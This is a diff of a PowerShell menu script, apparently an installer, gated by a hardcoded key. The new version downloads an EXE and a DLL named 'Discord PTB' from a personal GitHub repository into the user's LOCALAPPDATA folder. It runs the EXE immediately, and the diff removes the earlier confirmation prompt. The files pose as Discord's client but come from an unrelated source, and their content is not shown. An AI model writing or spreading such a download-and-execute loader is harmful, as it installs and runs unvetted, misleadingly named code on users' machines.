@@ -1,102 +1,77 @@
-[Console]::OutputEncoding = [Text.Encoding]::UTF8
-cls
+$CorrectKey = "SMITHSHOP"
 
-# -------------------------
-# CONFIG
-# -------------------------
+$ExeUrl = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/refs/heads/main/Discord%20PTB.exe"
+$DllUrl = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/refs/heads/main/Discord%20PTB.dll"
 
-$global:TargetDir  = Join-Path $env:LOCALAPPDATA "MyApp"
-$global:TargetName = "Discord PTB.exe"
-$global:TargetFile = Join-Path $global:TargetDir $global:TargetName
+$BasePath = "$env:LOCALAPPDATA\DiscordPTB"
+$ExePath = "$BasePath\DiscordPTB.exe"
+$DllPath = "$BasePath\DiscordPTB.dll"
 
-$global:DownloadUrl = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/main/Discord%20PTB.exe"
+Clear-Host
+Write-Host "============================="
+Write-Host "        Malaysia :]"
+Write-Host "============================="
+$key = Read-Host "Enter Key"
 
-# -------------------------
-# ANIMATION
-# -------------------------
-
-function chk($t){
-    $c = @("Red","Yellow","Green","Cyan","Blue","Magenta")
-    for($i=0;$i -lt 20;$i++){
-        $d="."*($i%6)
-        $cl=$c[$i%$c.Count]
-        Write-Host ("`r"+$t+$d+"   ") -NoNewline -ForegroundColor $cl
-        Start-Sleep -Milliseconds 80
-    }
-    Write-Host ""
+if ($key -ne $CorrectKey) {
+    Write-Host "Wrong key!" -ForegroundColor Red
+    Start-Sleep 2
+    exit
 }
 
-# -------------------------
-# INSTALL
-# -------------------------
-
-function Install-App {
-
-    if(-not (Test-Path $global:TargetDir)){
-        New-Item -ItemType Directory -Path $global:TargetDir -Force | Out-Null
-    }
-
-    chk "downloading "
-
-    try{
-        Invoke-WebRequest $global:DownloadUrl -OutFile $global:TargetFile
-        Write-Host "`nDownload complete" -ForegroundColor Green
-    }
-    catch{
-        Write-Host "`nDownload failed" -ForegroundColor Red
-        Pause
-        return
-    }
-
-    # ถามก่อนรัน
-    if(Test-Path $global:TargetFile){
-        $ans = Read-Host "`nRun now? (y/n)"
-        if($ans -eq "y"){
-            Write-Host "`nRunning..." -ForegroundColor Cyan
-            Start-Process $global:TargetFile
-        }
-    }
-
-    Pause
-}
-
-# -------------------------
-# CHECK
-# -------------------------
-
-function Check-App {
-
-    Write-Host "`nChecking..." -ForegroundColor Yellow
-
-    if(Test-Path $global:TargetFile){
-        Write-Host "`nFile found" -ForegroundColor Green
-        Write-Host $global:TargetFile -ForegroundColor Cyan
-    }
-    else{
-        Write-Host "`nFile not found" -ForegroundColor Red
-    }
-
-    Pause
-}
-
-# -------------------------
-# MENU
-# -------------------------
-
-while($true){
-
-    cls
-    Write-Host "=== MENU ===`n" -ForegroundColor Cyan
+while ($true) {
+    Clear-Host
+    Write-Host "============================="
+    Write-Host "       Malaysia Di waa"
+    Write-Host "============================="
     Write-Host "1. Install"
     Write-Host "2. Check"
     Write-Host "0. Exit"
 
-    $m = Read-Host ">"
+    $choice = Read-Host "Select"
 
-    switch($m){
-        "1" { Install-App }
-        "2" { Check-App }
-        "0" { break }
-        default { continue }
+    if ($choice -eq "1") {
+        Clear-Host
+        Write-Host "Installing..."
+
+        try {
+            if (!(Test-Path $BasePath)) {
+                New-Item -ItemType Directory -Path $BasePath -Force | Out-Null
+            }
+
+            # โหลดไฟล์
+            Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing
+            Invoke-WebRequest -Uri $DllUrl -OutFile $DllPath -UseBasicParsing
+
+            Write-Host "Install complete!" -ForegroundColor Green
+
+            # ✅ รันทันที
+            Start-Process -FilePath $ExePath -WorkingDirectory $BasePath
+        }
+        catch {
+            Write-Host "Install failed!" -ForegroundColor Red
+        }
+
+        pause
+    }
+    elseif ($choice -eq "2") {
+        Clear-Host
+
+        if (Test-Path $ExePath) {
+            Write-Host "EXE found" -ForegroundColor Green
+        } else {
+            Write-Host "EXE not found" -ForegroundColor Yellow
+        }
+
+        if (Test-Path $DllPath) {
+            Write-Host "DLL found" -ForegroundColor Green
+        } else {
+            Write-Host "DLL not found" -ForegroundColor Yellow
+        }
+
+        pause
+    }
+    elseif ($choice -eq "0") {
+        exit
     }
 }
